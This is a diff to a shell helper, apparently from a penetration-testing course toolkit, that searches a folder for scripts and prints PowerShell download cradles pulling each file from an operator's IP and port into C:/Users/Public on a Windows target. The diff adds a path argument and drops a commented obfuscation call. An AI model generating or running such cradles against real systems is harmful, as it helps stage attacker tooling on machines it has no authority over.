@@ -267,21 +267,19 @@
                 RED='\033[0;31m'
                 NC='\033[0m' # No Color
 
-                if [ $# -eq 3 ];then
-                        IP=$1
-                        PORT=$2
-                        EXTESION=$3
-                        find /home/vagrant/OSEP -name "*.$EXTESION" | while read SCRIPT_PATH 
+                if [ $# -eq 4 ];then
+                        WORKING_PATH=$1
+                        IP=$2
+                        PORT=$3
+                        EXTESION=$4
+                        find $WORKING_PATH -name "*.$EXTESION" | while read SCRIPT_PATH 
                                 do
                                         FILENAME=$(echo "$SCRIPT_PATH" | rev | cut -d"/" -f1 | rev) 
                                         DOWNLOAD_CRADLE="(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$SCRIPT_PATH','C:/Users/Public/$FILENAME')"
-                                        # DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
-                                        echo "$DOWNLOAD_CRADLE" | sed "s/\/\/home\/vagrant\/OSEP//g"
-                                        # echo "$DOWNLOAD_CRADLE_OBFS"
-                                        echo "\n"
-                                done
+                                        echo "$DOWNLOAD_CRADLE" | sed "s*$WORKING_PATH/**g"
+                                        done
                 else
-                        echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT>${NC}"
+                        echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <PATH> <IP> <PORT> <EXTENSION>"
                 fi
         }
 
